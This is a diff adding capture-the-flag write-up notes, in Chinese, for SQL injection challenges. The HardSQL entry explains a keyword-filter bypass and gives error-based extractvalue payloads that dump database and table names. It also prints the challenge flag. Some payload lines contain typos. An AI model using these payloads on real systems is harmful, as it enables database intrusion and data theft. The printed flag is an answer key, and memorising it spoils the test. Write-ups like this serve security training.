@@ -199,3 +199,12 @@ select * from 表名 where username= '' and password=''
     和上题一样，但不止登陆成功，需要拿到数据库名，表名，字段名，id=16时有flag，让我看了好久名字，估计都是出题人之类的= =
 ### 13.[极客大挑战 2019]BabySQL
     同上题，过滤了，但是<>直接绕过，如sele<>ct passwo<>rd uni<>on等
+### 14.[极客大挑战 2019]HardSQL
+    一共过滤了union, 空格, and, or, ., ', ", =, 但是()没有被过滤所以需要用到报错注入extractvalueh或者updatexml
+    贴上payload：
+    1^extractvalue(0x7e, (selct(group_concat(database()))) ,0x7e)得到geek数据库名
+    1^extractvalue(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e)表名H4rDsq1
+    后面有个坑点，由于extractvalue和updatexml只能读到最多32位的字符串，所以需要进行字符串截取，这里substr被过滤了需要使用left和right进行过滤。
+    flag{c941bb75-0f2c-4c71-be8f-74
+    1-be8f-741142ba4ddf}组合得到flag
+    
